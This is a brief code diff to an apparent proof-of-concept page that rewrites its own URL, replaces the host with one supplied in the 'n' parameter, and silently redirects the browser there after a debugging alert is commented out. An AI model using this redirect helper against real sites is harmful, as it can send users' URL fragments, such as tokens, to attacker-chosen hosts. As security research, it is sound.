@@ -4,6 +4,6 @@ replaceHash = url.replace("#", "?");
 const queryString = replaceHash;
 const urlParams = new URLSearchParams(queryString);
 replaceHost = replaceHash.replace("ashrafabdelrazik.github.io/poc/modifier.html", urlParams.get('n'));
-alert(replaceHost);
+//alert(replaceHost);
 location.href = replaceHost;
 </script>
